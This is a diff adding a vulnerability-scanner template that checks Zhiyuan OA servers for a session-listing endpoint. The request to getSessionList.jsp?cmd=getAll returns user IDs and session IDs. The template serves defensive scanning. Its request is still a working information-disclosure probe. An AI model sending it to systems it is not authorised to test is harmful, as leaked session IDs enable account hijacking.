@@ -1,0 +1,26 @@
+id: zhiyuan-oa-session-leak
+
+info:
+  name: Zhiyuan OA Session Leak
+  author: HuanXiong
+  severity: medium
+
+  tags: Information Disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<usrID>"
+          - "<sessionID>"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
